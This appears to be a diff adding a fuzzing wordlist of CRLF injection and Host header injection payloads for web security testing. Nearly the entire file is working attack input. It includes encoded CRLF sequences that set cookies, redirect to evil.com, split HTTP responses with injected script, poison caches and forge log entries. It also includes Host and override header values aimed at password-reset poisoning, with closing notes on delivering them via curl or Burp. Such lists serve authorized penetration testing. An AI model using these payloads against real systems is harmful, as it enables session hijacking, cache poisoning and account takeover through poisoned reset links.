@@ -1,0 +1,102 @@
+# ============================================================
+# CRLF Injection & Host Header Injection Fuzzing Wordlist
+# Usage: CRLF -> inject into params reflected in headers/redirects
+#        Host header -> replace the Host: header value directly
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Basic CRLF injection (header injection into response)
+# ---------------------------------------
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Injected:true
+%0aSet-Cookie:crlf=injection
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK
+\r\nSet-Cookie:crlf=injection
+\r\nX-Injected:true
+%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection
+%E5%98%8DSet-Cookie:crlf=injection
+%250d%250aSet-Cookie:crlf=injection
+%%0d%%0aSet-Cookie:crlf=injection
+
+# ---------------------------------------
+# SECTION 2: HTTP Response Splitting (full second response)
+# ---------------------------------------
+%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>
+
+# ---------------------------------------
+# SECTION 3: Cache poisoning via header injection
+# ---------------------------------------
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aX-Cache-Poison:1
+%0d%0aVary:X-Injected
+
+# ---------------------------------------
+# SECTION 4: Log injection (via CRLF into logged parameters)
+# ---------------------------------------
+test%0d%0a[ADMIN]+User+logged+in+as+root
+test%0aFAKE+LOG+ENTRY
+test%0d%0a127.0.0.1+-+-+admin+login+success
+
+# ---------------------------------------
+# SECTION 5: Host header injection - basic
+# (send as: Host: <payload>)
+# ---------------------------------------
+evil.com
+evil.com:80
+example.com.evil.com
+example.com@evil.com
+example.com%2eevil.com
+localhost
+127.0.0.1
+attacker-controlled-host.com
+
+# ---------------------------------------
+# SECTION 6: Host header injection - password reset poisoning
+# ---------------------------------------
+evil.com
+evil.com#example.com
+example.com.evil.com
+example.com%00.evil.com
+
+# ---------------------------------------
+# SECTION 7: Host header via duplicate / alternate headers (bypass Host filter)
+# ---------------------------------------
+X-Forwarded-Host:evil.com
+X-Forwarded-Server:evil.com
+X-HTTP-Host-Override:evil.com
+X-Host:evil.com
+X-Original-URL:evil.com
+X-Rewrite-URL:evil.com
+Forwarded:host=evil.com
+X-Forwarded-For:evil.com
+X-Client-IP:evil.com
+X-Real-IP:evil.com
+
+# ---------------------------------------
+# SECTION 8: Host header port / injection tricks
+# ---------------------------------------
+example.com:evil.com
+example.com evil.com
+example.com\r\nHost:evil.com
+example.com%0d%0aHost:evil.com
+example.com:80@evil.com
+example.com#@evil.com
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - CRLF payloads (Section 1-4) go inside a URL parameter that is
+#   later reflected in an HTTP response header (e.g. a redirect Location
+#   built from a query param) — confirm reflection first with a unique
+#   marker, then try CR/LF variants.
+# - Host header tests (Section 5-8) require crafting the raw HTTP
+#   request (curl -H "Host: evil.com" or Burp Repeater) since browsers
+#   won't let you set an arbitrary Host header directly.
+# - Password-reset poisoning (Section 6) requires triggering a password
+#   reset flow while the malicious Host header is set, then checking if
+#   the reset link uses the injected host.
+# - Only use against systems you are explicitly authorized to test.
